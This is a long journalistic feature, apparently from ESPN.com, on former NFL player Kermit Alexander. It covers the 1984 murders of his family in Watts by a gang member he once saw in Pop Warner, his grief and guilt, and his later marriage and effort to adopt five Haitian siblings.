Presswire Kermit says the greatest moment of his career was being traded from the 49ers to his hometown Los Angeles Rams ; it meant he could play in front of his mother , Ebora .
After the game , Kermit -- still channeling Ebora -- felt guilty about mouthing off and sought out Lombardi .
" I 'm sorry , Coach , " he said , to which Lombardi answered , " No , I was wrong .
I had no business being out there . "
All was forgiven , but this was the constant war in Kermit 's head : calm versus pissed , good versus evil .
Then came Nov. 10 , 1968 .
Kermit was an All - Pro that season , and in a game at Wrigley Field , the Bears made the mistake of running the elegant Gale Sayers to his side of the field .
Kermit went airborne to take out the lead guard , but the guard dove away from him to avoid contact , which left Kermit flying straight into Sayers ' right knee -- just as Sayers was planting his leg .
" It just blew his knee all apart , " Kermit says .
" It was sickening to hear . "
Sayers ' leg was just dangling .
Kermit heard Sayers crying and helped drag him to the sideline .
But along the way , Kermit caught Halas ' glare and handed the running back over , saying : " Hey , old man , come get this one and send me another because this one 's all used up . "
Halas flat - out started cursing at that point .
After the game , Kermit visited the Bears locker room to tell Sayers he was sorry -- more guilt .
But he was vilified publicly nonetheless .
Sayers was already wildly popular ; then , in 1971 , the movie " Brian 's Song " would make him iconic .
The film showed Kermit 's hit in slow motion and told the story of how Brian Piccolo replaced Sayers and then nursed Sayers back to health before Piccolo died of cancer .
If there was anything close to a villain in that movie , it was Kermit .
He received a death threat from a Bears fan ; he could n't live it down .
AP Photo Kermit inadvertently tore up Gale Sayers ' knee in 1968 -- and became the villain of " Brian 's Song . "
But his 49ers teammates knew better .
In their locker room , few were as revered as Kermit .
He was never intimidated by management and would gladly show teammates his contract so they knew what kind of money to ask for .
To this day , players from that team thank him for their nest eggs .
Kermit knew the Ebora in him was causing him to help .
Deep down , he was still the kid from Watts , and he says the greatest moment of his career was being traded home to the Los Angeles Rams in 1970 because then he could be around his family 24/ 7 .
He 'd been away in San Francisco for seven seasons , but now , post-riots , he'd get to see how his old neighborhood was faring .
The answer : not well .
Gangs were everywhere , and they were more violent now .
They were recruiting in junior high schools and even grammar schools , looking for badasses .
If a kid did n't have a dad , the Crips gladly played the role .
Gang members bankrolled kids , lent them cars , let them have sex with Crippettes .
Kermit talked to people in the streets ; he knew why the young kids were straying .
So he and one of his brothers - in - law co-founded a Pop Warner football team , the Watts Wildcats .
Kids who were on the fence could play football instead of gangbanging , and Kermit even brought his team to Rams games to show them what was possible .
In the early and mid-'70s , Kermit went to as many Pop Warner games as he could -- it was cleansing -- and one player stood out to him more than any other .
The kid played for another team in South Central L.A. , and although the player was only about 8 years old and 4 - foot - nothing , he kept winding up in the end zone .
He was swifter , more instinctive and more physical than anyone else on the field , and , frankly , he reminded Kermit of himself .
And when Kermit saw the kid 's temper , he had a full - on déjá vu .
Courtesy Horace Mann Junior High School yearbook Tiequon Cox , pictured in seventh grade , reminded Kermit of himself .
At one point in a game , this kid -- Tiequon Cox -- spiked a ball after a bad call , then picked it up and threw it at the referee .
He punched a teammate in the back for missing a block and cursed his coach for not finding better linemen .
Eventually , he had to be physically dragged off the field , and someone in the stands told the kid to put a sock in it .
Tiequon nearly climbed the stairs to fight .
It hit home for Kermit .
Twenty - odd years earlier , he'd had his own meltdown , with his father yanking him off the field .
This kid needed an intervention , too .
Up in the stands , Kermit rose up and proclaimed , " Somebody needs to do something with that kid , he 's too good a ballplayer to be like that .
Somebody ought to help him . "
Everyone nodded , but not one lifted a finger , Kermit included .
Had Ebora been at the game , he says she would 've ordered him down to the field , and he would 've said , " Yes , ma'am . "
He would 've gone to the sideline to assist the coaches , would 've tried to be a friend to the kid .
He would 've driven to the kid 's school and checked in with his teachers .
He would 've become a mentor , would 've taken him to meet other pro players , would 've kept daily tabs on him .
Instead , Kermit did nothing .
" I was a star , " he says .
" I had too much to do .
All I did was talk about it .
I did n't check in with anybody .
I left . "
Worst decision of his life .
A most distinguished mama's boy
Ten years later , Kermit was leading a distinguished life .
He had been president of the NFL Players Association .
He 'd coached high school football .
He 'd been a local probation officer .
He was a commentator on UCLA and L.A. Express radio broadcasts .
He and his wife were raising two children , and he continued to be philanthropic in his spare time .
He did n't live in Watts , but he was n't avoiding the place , either .
His mother still kept her home there .
She and Kermit 's dad had split up while Kermit was in college , and the Alexander kids kept begging her to move to Ladera Heights or somewhere on the West Side .
But all of Ebora 's friends were in Watts , and she still loved making peanut butter sandwiches for kids in the neighborhood .
She 'd tell people her hugs went a long way there , and she resisted everyone 's obsession with her moving .
Courtesy of Alexander family Kermit 's mother , Ebora Alexander .
Kermit felt it was his duty to go see her at least once a week , so early every Friday morning he 'd slip into her kitchen for a cup of coffee .
The two of them had been having these rendezvous since right before college , and Kermit always left feeling reinvigorated .
In the summer of 1984 , the family was actually glad to have her in Watts because the Olympic Summer Games were being held only 30 blocks away , at the L.A. Coliseum .
And late that August , 59 - year - old Ebora invited several of her grandkids over to stay for a long weekend , so they could walk down South Flower Street and collect Olympic pins .
Now it was just like old times because her house was bustling .
Ebora 's youngest daughter , 24 - year - old Dietra , was already living in the front bedroom , and her 34 - year - old son Neal , who was on disability , was already living in a back bedroom .
But the arrival of Ebora 's grandsons -- 8 - year - old Damon , 13 - year - old Damani and 14 - year - old Ivan -- made it a true home again .
Damon and Ivan were the sons of Kermit 's sister Daphine , and Damani was the son of Kermit 's sister Gerry , and before the sisters would leave for the evening , all eight of them would eat a jovial dinner together .
Ebora -- whom everyone called " Madee , " short for " Mother Dear " -- adored playing hostess .
Kermit had stopped by Aug. 29 , two days before the Olympics ' closing ceremonies , to see how the group was doing , and he particularly remembers not being able to leave Ebora that day .
He had a business meeting to attend , and after she walked him to his car , he kept driving around the block to come back and see her on the front porch .
" Well , go on , " she told him .
And he tried .
Once , he made it 10 blocks down Flower Street but drove back again .
" What is wrong with you ? " Ebora asked .
" I do n't know , I do n't know , " Kermit answered .
" Listen , I love you .
You go take care of your business , and I 'll talk to you later . "
Then she blew him a kiss goodbye .

Tragic turn
Aug. 31 was a Friday , which meant Ebora was up early at about 5 a.m. , brewing a pot of coffee , waiting for Kermit .
At about 5:30 , her front door opened , and the wrong person entered -- an 18 - year - old stranger with a rifle .
He walked into Ebora 's kitchen and shot her three times in the head just as she was turning from the refrigerator to put cream in her coffee .
Next , the gunman entered a sitting area where Damon and Damani had been sleeping in a twin bed .
Damani , awoken by the noise , apparently tried crawling under the bed before he was shot and killed .
Damon never woke up and took a single gunshot to the forehead .
The intruder then went into the next bedroom and executed Dietra , shooting her in the face while she was still under the covers .
Courtesy of Alexander family Ebora was considered " the nicest lady in Watts " by her neighbors .
At that point , Neal -- who'd been sleeping down the hall -- entered Dietra 's room to leap on the shooter 's back , while 14 - year - old Ivan hid in a closet .
There was a struggle , and the shooter apparently landed awkwardly on a red trunk by the door .
A second intruder , the gunman 's lookout man , ran to their getaway van , and the shooter punched Neal in the face before following his accomplice out .
Neal exited through a back door , got to a phone and called his oldest brother .
" Kermit , why did they do that ? "
" What did they do ? "
" Why would they mess up Mom like that ? "
" Neal , what happened ? "
" Mom 's been shot . "
" Oh my God .
Call the police .
I 'm on my way . "
Kermit was n't first to the carnage .
Ivan had rushed out of the closet to call his mom , Daphine , telling her , " Something bad 's happened to Madee . "
Daphine then called her sister , Joan , who was a sergeant in the JAG Reserve military unit .
By the time Joan arrived , the house had been cordoned off , and Joan was caught by local news cameras trying to force her way through the front door .
" This is my mother 's house !
I have a right to be in here ! " she said , sobbing to the police .
She and the other family members were then ushered to police headquarters , still unsure of what had taken place .
Kermit was already in a back room at the station , comforting Neal .
As the oldest son , Kermit had been asked to identify the bodies , which were barely recognizable .
Kermit was in a daze .
But he was still determined to play the role of family protector until he actually saw his family .
" Kermit 's face looked so horrible , so sad , " Joan says .
" I knew something bad had happened .
But I had no idea it was that bad .
And then they said all of them were dead , and I 'm like , ' What do you mean all of them are dead ? '
I just lost it ; I was pounding on this filing cabinet , and Kermit was just speechless .
He was on a bench my big brother and I just looked at him and said , ' Why ? '
I just screamed .
And I started crying .
He was so pained , he could n't even hold me .
His arms were just , like , hanging . "
He was similarly numb at the funeral , although he did take charge that morning and insist the caskets stay closed because of the brutality of the murders .
The family was still confused as to why its mother 's house had been a target , and those who were still alive wondered whether the gunmen would kill them next .
Joan , for one , began sleeping on her floor , facing her staircase , with a revolver under her pillow .
Kermit had no answers for any of them , and once Ebora was buried , he began to disappear every night after dark .
His family had no idea where he was -- and never would have guessed it .
He was roaming the streets of Watts .
Looking for the killers .
Courtesy of Alexander family Kermit 's 24 - year - old sister , Dietra , and his nephews , 8 - year - old Damon and 13 - year - old Damani , were in the wrong place at the wrong time .
Looking for revenge in all the wrong places
The temper was back .
His father had told that boxing coach 30 years earlier that Kermit might be capable of killing someone .
Now Kermit was going to prove it .
He spoke to his friends in the streets , friends who might have heard who had pulled the trigger on Kermit 's family .
Watts was a compact community , and Kermit found out that members of a gang , the Rollin 60 Crips , had been bragging about " blowing a bitch 's head off . "
He says he " went crazy . "
His head was on fire .
All he could think about was that he had overslept the morning of the murders , that he should 've been sipping coffee with Ebora when the shooter walked in .
Maybe he would 've been killed , too .
Or maybe he would 've saved his mother with his bare hands .
He bought a pistol and decided he was going to wipe out the Rollin 60s , one by one , two by two .
" Whatever it took , " he says .
" It was the wild , wild West all over again .
I was in a murderous rage .
I was very , very quiet , but I 'd determined that my life was over and I was going to get rid of them .
I would 've killed them all or gotten killed in the process .
Nobody else was going to suffer again because of them . "
He says he walked the streets for six months , looking for his mother 's killers night after night .
He 'd grown up there .
He knew whom to go to for information .
Some of his informants he threatened , some he begged , some he paid .
But he could n't find anybody to turn his murderous rage on .
Finally , he received a call from a former high school classmate who was working as a juvenile probation officer .
A kid had confessed to hiding the murder weapon from that morning .
This kid had n't done the killing , but he knew exactly who had .
Someone named Tiequon Cox .
Consumed by guilt
Courtesy Los Angeles County Courthouse Tiequon Cox was arrested and charged with quadruple homicide .
His ensuing trial in late 1985 was of the highest profile .
The name meant nothing to Kermit .
He could n't place it , did n't recognize it .
But the information was forwarded to the cops , and they discovered Cox 's palm prints on the red trunk in Dietra 's room .
At his trial in late 1985 , details emerged about the young man 's life .
Cox had been abused by his mother , Sondra , and although his attorneys did not get overly specific in court , his juvenile report -- plus his mom's arrest records -- showed she had been a heavy drinker and a prostitute .
At age 4 , he 'd witnessed her try to kill his sister , and at age 5 , he 'd watched her attack a police officer with a knife .
Then , at age 8 -- the age at which he would have been playing Pop Warner football -- his mother allegedly set fire to his grandmother 's house , where Cox had been staying .
By the time the kid reached Horace Mann Junior High School , he 'd joined the Rollin 60 Crips , who , in a sordid way , became his new family .
The jurors heard all of this .
They heard how Cox dropped out of the ninth grade , how he then robbed three students and hit one of them with a mop handle .
They heard how he pointed a gun at a mother who was waiting for her child outside the school .
They heard how he stole the woman 's car and led police on a high - speed chase for 30 minutes before hitting a telephone pole .
They heard the prosecution describe how Cox fell deeper into a life of violence .
They heard how , at age 18 , he and two other gang members had been hired to murder a family in Watts .
Apparently , a girl had been paralyzed in a shooting incident at a local bar , and her family was suing the bar 's owner .
The bar owner wanted to eliminate the lawsuit , so he hired the gang members to assassinate the girl 's entire household .
The bar owner wrote the family 's address on a piece of paper , but Cox and his accomplices misread it .
So they barged into the wrong house -- the home of Ebora Alexander .
Periodically , Kermit showed up in court .
As he listened to the case unfold , it took everything in his power not to jump over the railing and pummel the kid .
Prosecutors were pushing for the death penalty , and as the family heard more and more about Cox 's life , Kermit 's sister Mary -- who helped run Kermit 's former Pop Warner team -- pulled her brother aside .
Courtesy of Alexander family Kermit demanded that the caskets of his family members stay closed because of the brutality of the murders .
" Do you know who that kid is ? " she asked .
Kermit had n't the vaguest idea .
" That 's the kid that was always in trouble in Pop Warner .
Look at what he 's done ! "
" Oh my God . "
Kermit could barely breathe .
He wanted to turn himself in to authorities .
He had neglected this kid a decade earlier , and now Cox had shot four of his loved ones in the head .
Kermit blamed himself , decided he'd been , in some ways , an accomplice to his mother 's death .
" The realization was like white heat , " he says .
Even when Cox was found guilty and sent to death row in San Quentin State Prison , Kermit found no consolation .
His marriage was failing because of neglect , and he was on the verge of divorce .
He 'd lost his radio gigs .
And even some of his brothers and sisters were suspicious that Ebora had been murdered because of Kermit 's business dealings .
Just before the attack , Kermit had pulled out of a horse - breeding contract , and one of his brothers - in - law heard that he had made enemies in the process .
None of this was related to the murders , but there was finger - pointing by the family , and Kermit felt like a pariah .
In the late 1980s , he packed up and moved an hour away to Riverside , Calif. , to live near his father , who had taken ill .
He 'd never had a chance to say goodbye to his mother , and he was n't going to risk that happening with his dad .
He wound up coaching youth teams here and there , moving from mindless job to mindless job .
Worse yet , he was still racked by guilt , was still blaming himself for turning his back on Cox in Pop Warner .
" It was paralyzing , " he says .
" When my mother died , the lights went off in my life .
I ceased to exist as a person .
I was at the bottom , on an island , trying to survive , trying to figure out what to do with myself . "
Then he got a phone call from another Ebora .
Mom 2.0
Her name was actually Tami Clark , and , he 'd realize later , she was like his mother reincarnated .
Tami was 20 years younger than he was and one of those people who has never met a stranger in her life , just like Ebora .
She did charity and volunteer work for the Chamber of Commerce in Mammoth Lakes -- five hours north of Riverside -- and in the summer of ' 91 , she happened to need a grand marshal for a Fourth of July parade .
One of her friends , former Dallas Cowboys kicker Efren Herrera , suggested Kermit .
" Who ? " Tami asked .
" Is he any good ? "
She ended up offering him the gig over the phone , and Kermit accepted for the sole purpose of taking a much - needed vacation .
He had nowhere else to go , no family to picnic with .
But as soon as he met Tami , he thanked his lucky stars .
Inside , she was almost as broken as he was , unhappy in her marriage and burying herself in work .
But she was also a master at hiding it and made it her mission to hear Kermit belly - laugh .
She could tell immediately he was closed off , so she talked his ear off and urged him to make himself at home .
He asked her how to " turn on " the microwave in his suite , and she joked , " Just say ' Ooooooh , baby , ooooooh , baby . ' "
He doubled over , and remembers thinking it was his first laugh since the murders , remembers thinking he needed that .
After the parade , they went their separate ways , until Kermit heard Tami had moved to nearby Temecula and was getting a divorce .
They had a dinner date , which led to a second dinner date , which led to a third .
Tami was intrigued .
One night while watching TV at home , she stumbled upon " Brian 's Song . "
She had enjoyed the film from way back , because of the love story and because she went to Baylor right after Mike Singletary played there and became a full - on Chicago Bears fan .
But she had never paid much attention to the football scenes -- until a certain No. 39 came on the screen and tore up Sayers ' knee .
She covered her eyes and then called Kermit .
" Hi , I just watched ' Brian 's Song . '
Are you the one that hit Gale Sayers ? "
" Um , yes . "
" We 're through .
Do n't ever call me again . "
And she hung up .
Courtesy of Alexander family Tami Clark was the first person to make Kermit laugh after the murders .
They ended up dating for a decade .
She was joshing , of course -- that 's Tami -- but Kermit thought , " Oh , no , here we go again . "
He was in such a dark place that he believed her .
He 'd have believed anything at that point .
He remembered the death threat he'd gotten because of the Sayers hit ; it was all still a sore spot for him .
People forget he carried Sayers off the field , that he went into the Bears ' locker room to apologize .
He called Tami back and said , " Gale Sayers is not going to break up my relationship with you . "
She began to giggle , and , finally , he started to figure this woman out .
By the end of 1992 , they were living together , although there was still some sort of wall between them .
He admits they were " intimate , but not close , " and the reason was Aug. 31 , 1984 .
He always was vague when she asked him about his mother ; she could never get a direct answer .
They would be out in public and someone would pull her aside and say , " Oh gosh , I heard about your husband . "
They were n't married , of course , but her only response would be , " You mean about his family ? "
She went to the library -- this was pre-Internet -- and searched through microfiche from 1984 .
She read every article and found herself weeping .
Later , she and Kermit were driving on the freeway to see her parents in Anaheim when she said , " Every time we go somewhere , somebody asks me about your family .
One day , when you 're ready , could you tell me , from start to finish , what happened ? "
He had never discussed the murders with anyone outside his family -- and had n't planned to .
He floored the car and exited the freeway .
She thought he was going to crash the car on purpose and kill them both , but instead he slammed on the brakes and pulled into a deserted parking lot .
Then he dumped it all on her .
His opening line was , " OK , I 'm going to tell you this one time , and you can't interrupt me or ask questions because this may be the only time I tell this story . "
More than four hours later , he was done , sobbing like a child .
The moment bonded them , and they ended up staying together for nine years .
At first , both had been burned out on marriage , but as time moved on , Tami wished he'd put a ring on her finger .
The problem was , he still kept her at a safe distance .
He comforted her when she lost her stepdad , and she comforted him when he lost his father , but in the aftermath of these sad events , they 'd go to their separate corners .
Tami was still hoping , perhaps blindly , that he would open up to her and propose .
But Kermit would n't go there .
He'd be preoccupied with get - rich - quick business deals , all of which failed , or he'd withdraw and spend hours at the golf course .
By 2001 , they were polar opposites .
Tami was embracing religion , while Kermit -- the grandson of a pastor -- could n't trust any God who would allow the brutalization of his mother , sister and nephews .
So Tami moved out .
Kermit became a drifter .
He moved to Oklahoma to co-found a Thoroughbred horse racing syndicate , largely because horses had been his father 's passion , and a barn was now the closest thing he had to family .
But the business failed , much of his football money was gone and he remained a transient , living out of his car .
He could n't even commit to a drawer .
He eventually caught a flu bug that would n't go away -- a sore throat , red eyes and a hacking cough that stayed for weeks .
He was 60 now ; this was potentially dangerous .
The flu turned into pneumonia , and he actually believed that the illness suited him , that he somehow deserved it .
He was n't dead , but his eyes were dull , and all he wanted to do was sleep .
And then , one night , Ebora came to him in a dream .
What is found becomes lost
Maybe it was the flu medication he was on , but Kermit is adamant that he heard his mother 's voice while he was sleeping .
He says she scolded him for feeling sorry for himself and urged him to get back to being a protector , a provider .
She also told him that if he did n't return to his roots , he was n't going to live another year .
Instantly , Kermit thought of Tami .
They had been speaking over the phone every two or three weeks while he was in Oklahoma , and he was always reminded how much her voice -- the pure energy of it -- cheered him .
By now , he was over the pneumonia and taking stock of his life .
He asked himself , " What am I going to do about Tami ? " and realized the happiest he'd been since 1984 was with her .
So , in the spring of 2003 , he moved back to Riverside .
They met for coffee , and she broke the bad news :
She had met somebody else .
Kermit called her the next morning at 4:30 .
She could tell he'd been crying .
She asked him whether he was OK , and he said , " No Has this man asked you to marry him ? "
Tami answered , " Not at all . "
But she was livid .
She sensed this was a competition to Kermit .
" I 've waited all this time for you to engage , and you wait until I start dating ? " she asked .
He told her that he'd had an epiphany , that he needed to come back and make it right .
She told him they would talk later .
That same spring , Tami committed to a 250 - mile charity bike ride and needed someone to train with .
Her boyfriend was n't interested ; Kermit was .
They spent hour after hour at nearby Lake Perris , riding the trails and talking on park benches .
He was finally an open book , finally sharing his guilt over Tiequon Cox .
There was a reconnection , albeit not a complete one .
Tami was immersed in her church , and Kermit was still unable to believe in anything spiritual .
In September 2003 , she told him she was going to Haiti with a Christian radio group to see whether she could make a difference there .
She left without him .
Sometimes you have to go far away to find yourself
As Tami stepped off the plane in Haiti , she could " smell the poverty . "
The sewer systems were backed up , and trash was decomposing in open bins .
On top of that , the temperature was an oppressive 90 - plus degrees .
She noticed water flow down a public irrigation system at the side of the road and watched pigs and oxen defecate in it .
She saw a man wash his motorcycle in it , as well .
Farther down the stream , she saw a woman using the water to prepare a meal .
Others were bathing in it .
Tami had to turn away .
There were no tropical breezes , only gusts of stench .
She said to herself : " God , you 've picked the wrong person .
I can't change this .
I have nothing to offer here .
You need someone rich who can write a check and hire a construction crew .
God , why am I here ? "
Her group was taken to the Mission of Hope in Titanyen .
She expected more hopelessness , but was stunned by the sight of 1,200 kids lined up for school , wearing color - coordinated uniforms .
She was told that 35 American pennies could provide a child with one meal a day .
She began to feel reassured .
The mission 's director , Brad Johnson , took them three - quarters of a mile up a hill , off the main road , to show them land he hoped to turn into a village .
That high , looking over the Caribbean , Tami finally smelled fresh air .
The heat and wind reminded her of her grandmother 's home in Amarillo , Texas , where windmills were used for power .
She asked Johnson whether anyone had discussed a windmill project at Mission of Hope , and he said someone just had .
Her light went on ; maybe she could contribute .
Courtesy of Alexander family Tami met Clifton on her trip to Haiti .
Johnson walked them down to the Mission of Hope orphanage , which housed 47 homeless children .
Tami was unsure of what she would see until -- out of the blue -- an emaciated boy , about 5 , walked up and poked her on the arm .
He called her " Mom . "
Tami 's jaw dropped .
She figured this kid , Clifton , called all woman visitors " Mom . "
Besides , Tami had already been a mom , had a grown 23 - year - old daughter from her first marriage .
But he kept poking her , kept calling her " my mom , " and when Tami ran into Johnson a while later , she said she 'd bumped into Clifton .
" Yes , everybody meets Clifton , " he said , laughing .
" Oh , that explains it , " Tami said .
" Because he kept coming over saying he wanted me to be his mama . "
" What ?
He never does that .
Are you sure it 's Clifton ? "
Johnson asked Tami to show him the child she was talking about .
She pointed to Clifton , and Clifton then ran straight at her , leaping into her arms .
Johnson was astounded .
Tami wanted to know more about the child , and Johnson explained that Clifton had been brought to their orphanage , near death .
He 'd been malnourished and had a distended stomach because of worms .
He had scabies , as well , on both feet and arms , and all his hair had either fallen out or turned orange because his scalp had lost all pigmentation .
His nails would n't grow , and his teeth were decaying .
Johnson said he had looked like a 90 - year - old man and had been given about a month to live .
The orphanage ended up nursing Clifton back to health until he fell and broke a femur weakened by a lack of calcium .
But , even then , his doe eyes and giant grin ingratiated him to everyone .
By the time Tami showed up , his health had stabilized , and she asked whether she could take him to town with her and let him swim at her hotel pool .
By the end of her six - day visit , Tami and Clifton were inseparable .
On the day she had to leave , Clifton refused to look at her and began wailing .
Tami's heart ached .
She told him , " Clifton , look at me .
I 'm gonna be back .
I 'm coming back .
You 've got to believe me . "
He would n't acknowledge her , would n't even watch her drive off .
He figured he'd never see her again , that she was like all the others .
No one ever came back to Haiti .
No one .
Saved by a bold 5 - year - old
Kermit was waiting for Tami when she returned to the States .
He invited her to Lake Perris , sat her down on a bench overlooking the water -- and asked her to marry him .
Courtesy of Alexander family Five - year - old Clifton " healed " Tami and Kermit and brought them together for good .
Her answer was no .
He could n't believe it .
Before their breakup , she 'd been dying for him to put a ring on her finger , and he wanted to know what had changed .
She mentioned her trip to Haiti , told him that she had met a little boy who'd worked his way into her soul .
She said she was going to make that child part of her life , some way , somehow , and she was going to dedicate herself to bringing windmills to Haiti and other Third World countries .
She loved Kermit , but she needed them to be on the same page .
She began to describe Clifton to him -- the little taps on the arm , him calling her " my mom . "
She said , " Kermit , come to Haiti with me .
I 'll introduce you to Clifton , and you can be part of it .
If this is something you want to do , then ask me to marry you again . "
In January 2004 , they flew down together .
When they arrived at Mission of Hope , Tami rushed inside to find Clifton while Kermit waited anxiously near their van .
He then saw a little head peek around the corner of the building , a boy who looked to be sneaking out of the orphanage .
A second later , the kid bolted past Kermit toward some other kids playing soccer .
" Clifton ! " Kermit shouted -- somehow guessing it was him .
Clifton stopped on a dime , turned , took two quick steps and jumped into Kermit 's arms .
" It was so natural , it was unbelievable , " Kermit says .
" I just called his name out , anticipating he 'd maybe stop , say hello , shake my hand .
But he just ran into my arms , a big grin on his face , just chattering like he had always been there .
It was the most comfortable thing .
That was the point when I completely let go .
I was OK .
I had healed .
I had the faith and courage to go on with my life .
" There was a reason to live now . "
Courtesy of Alexander family Tami and Kermit were told that Clifton nearly died at one point because of malnourishment .
Instant family
Kermit and Tami were married in May 2004 , at Lake Perris .
For their honeymoon , they flew to Haiti .
Their sole objective was to adopt Clifton , and Kermit was going to stop at nothing to get it done .
Every morning , from the moment he'd met Clifton , he 'd woken at 4 or 5 in the morning to say a prayer .
He would close his eyes and whisper : " I hope I do n't miss anybody today .
I can't miss someone and have them turn into Tiequon Cox .
Please , Lord , do n't let me miss Clifton .
Please do n't let me miss anyone again . "
Courtesy of Alexander family Their trip to Haiti led Tami and Kermit to marriage .
He was a new man all around .
Tami had put Kermit in touch with her pastor , Tom Lance , and Kermit reopened his relationship with God .
The events of 1984 came up in their private sessions , and Kermit made peace with his nine siblings and somehow was able to forgive Tiequon Cox .
By now , the killer was nearly 40 and still on San Quentin 's death row .
He 'd become notorious at the prison for stabbing the original Crip Stanley " Tookie " Williams in 1988 and for also trying -- and failing -- to escape from San Quentin in July 2000 .
But Kermit says he spoke to a prison official who told him that , over the years , Cox had finally learned to be less volatile .
The old pro no longer itched for Cox to be executed .
He saw the bigger picture .
He and Tami were now in spiritual sync and , by the end of 2004 , they 'd flown to Haiti six times .
Part of it was to begin their project , " Operation Windmill , " but a lot of it was to parent Clifton , to get the adoption rolling .
Fairly soon , though , there was a hitch : Clifton was n't available to be adopted .
Johnson told the couple that Mission of Hope 's goal was to raise children into strong , educated , Christian citizens , creating a more self - sufficient Haitian society .
Tami and Kermit could n't argue with that , but asked to stay in the child 's life .
They sent Clifton $ 300 a month , bought him clothes , covered his medical costs .
Clifton started calling Kermit " my dad . "
There was nothing that could keep them apart .
The only downside was that whenever Kermit and Tami would leave , Clifton would sink into a major depression for months on end .
He would n't eat .
He 'd fall ill .
The couple would try to cheer him up from long distance , but telephones were scarce at the orphanage .
One day Tami dialed the cell phone of one of Clifton 's role models -- a 20 - something orphan named Thony Durand -- and luckily found Thony playing soccer with Clifton at the time .
When Thony told Clifton that Tami and Kermit were on the line for him , the boy kept excitedly repeating , " Pour moi ?
Pour moi ? " Kermit started to cry .
By this point , the orphanage was concerned about Clifton 's emotional state , and one day when Johnson was in the U.S. , he pulled Kermit aside for a candid talk .
" I have to ask you and Tami to stop coming , " he said .
" Because he falls apart after you go .
It has put his health at risk . "
Kermit swallowed hard .
" Or , " Johnson said , " you 'll just have to adopt him . "
Kermit 's heart was pounding , and he raced to call Tami .
She wept at the news , and he felt like passing out cigars .
They were gaining a son .
Instant family , only bigger
The adoption paperwork was endless , and they had to somehow find Clifton 's mother for approval .
They knew she was still alive , but she could 've been living anywhere in the country .
What 's more , Haitian adoption policies seemed to change direction every time the wind blew .
By 2005 , Clifton was still in the orphanage .
But Kermit and Tami were resolute and began planning for their life with Clifton .
They found a one - story , three - bedroom house on a cul - de-sac in Riverside with a horse stall and a swimming pool .
It was n't elaborate or brand - new , but it had nice acreage in the back and a dirt basketball court .
To a young man from Haiti , it would seem like the Taj Mahal .
Courtesy of Alexander family Four kids whom Tami and Kermit did n't even know wanted their picture taken with Clifton -- they were his brothers and sisters .
On one visit to see Clifton , the couple wanted to deliver food and clothes to other orphanages around Port - au - Prince .
Clifton asked to be their tour guide and directed them to the Good Samaritan orphanage in Cabaret .
There , they noticed Clifton hugging and high - fiving four of the children there : two boys and two girls .
They 'd never seen Clifton this attached to other kids before , so a curious Kermit asked him , " Who are they ?
We would like to meet your friends . "
" It 's not my friends , " Clifton said in his fractured English .
" It is my brothers and sisters . "
Tami and Kermit were floored .
They had no inkling these kids even existed .
A moment later , the oldest boy of the group , Jameson , touched Tami's arm , asking whether they could all have a picture taken with Clifton .
" Because you are taking him away to America , " Jameson said , " and we will never see him again . "
Tami then looked at Kermit , who had tears in his eyes .
" We can't do this , " Kermit said .
" What do you mean ? " Tami asked .
" We either take them all or we do n't take any of them , " he said .
" I know , " she said .
" They 're still invested in each other . "
" Then we take them all , " Kermit said .
" Are you serious ? "
" We take them all . "
Did somebody say ' instant ' ?
Well , not exactly
Twenty - one years earlier , Kermit had lost four family members .
Now he stood to gain five .
He and Tami began to fly to Haiti every two or three months , 10 days at a time , desperate to find the kids ' mother .
They got a tip she was in a homeless shelter , at a church , and Tami says they found her lying down , " looking almost possessed looking 30 years older than she was . "
The woman had brain damage from malaria , and they learned Clifton and his brothers and sisters had been sent to the Good Samaritan orphanage after she had become ill .
Tami and Kermit approached the woman respectfully and asked her to OK the adoptions .
If she 'd been capable of caring for the five kids , it might have been different .
But she seemed thrilled to sign the paperwork .
The years crawled by , and every time the adoptions seemed to be progressing , there would be some kind of major calamity -- a hurricane or an election followed by a riot .
Clifton was well cared for at Mission of Hope , but in an attempt to give the other four kids stability , Tami and Kermit enrolled them in a more upscale boarding school , the Haitian Academy .
The cost was $ 30,000 a year for the four of them , but each child had a nanny to look after his or her needs .
It was the only way the couple could stay sane .
Still , Kermit was buoyed by the fact that whenever he and Tami visited Haiti , the kids called them " Mom " and " Dad , " and never anything else .
Back in the States , he and Tami had moved into their new house and already had begun decorating the children 's bedrooms and planning who would room with whom .
They knew they would need a longer dining room table , knew they would need a van .
Kermit liked the anticipation of it all .
He would close his eyes and daydream about a crowded house , just like the one he'd grown up in with Ebora .
His nine siblings , the ones he 'd always protected , told him they were there for him , that they wanted him to keep fighting for his five kids 3,000 miles away .
It warmed him .
But the wait was excruciating .
They each had jobs to help keep their minds off of the ordeal -- Kermit was a community service officer at Riverside Community College and Tami continued her charity work and fundraising .
She also had a lucrative gift basket business -- which had previously provided the couple with a nice windfall -- but the recession in the U.S. eventually took a financial toll on Kermit and Tami and they had to pull the four kids out of the Haitian Academy .
They moved them to HIS Home For Children , an orphanage in Port - au - Prince that , on the plus side , had better success getting kids adopted .
But nothing sped up .
The couple would grow frustrated with their adoption lawyer , or with the instability of the Haitian government , or just by time , ticking away .
Kermit turned 69 on Jan. 4 , 2010 , and there was still little advancement and little hope .
Status quo was a bear .
And then the earth moved .
Courtesy of Alexander family A Haitian insurrection had Tami and Kermit worried for the lives of ( left to right ) Manoucheka , Semfia , Zachary and Jameson .
A monstrous earthquake that changed everything
In the early afternoon of Jan. 12 of this year , Tami was driving on Interstate 15 , listening to her car radio .
A special news report came on , and the next 15 seconds changed her world .
There had been a major earthquake -- 7.0 magnitude -- in Haiti .
Mass destruction .
No telling how many were dead .
Tami remembers having " the life sucked out of me .
I could n't breathe . "
She called Kermit and instructed him to turn on the TV .
That 's when the old pro thought his life was over a second time .
Christopher Park for ESPN.com Kermit read his Bible every morning after the earthquake , convinced the five children were gone .
She pulled into the driveway of their home -- their kids ' home -- and they hugged and wept .
He assumed the kids were all dead , or at least the four in Port - au - Prince , only six miles from the quake 's epicenter .
He and Tami had been in Haiti just six weeks earlier , and over dinner with friends , she had asked , " Has Haiti ever had a major earthquake ? "
The answer was " not for about 200 years , " and she 'd been relieved because the construction was so pitiable there .
The cement was porous ; there were no building codes .
Haitians were more worried about looting , thieves and hurricanes .
So , as the news began pouring in , they could n't help assuming the worst .
Three million people were living in an area originally meant for 50,000 .
The casualties had to be extreme .
Tami called every Haitian phone number she knew , but the lines and signals were all down .
They could n't just march down to Haiti and start digging .
They were n't made of money .
Their 20 - plus trips to Haiti had sapped much of their savings , so they were at the mercy of their friends for information , for news about who died and who lived .
For four days , Kermit parked himself in front of their television set .
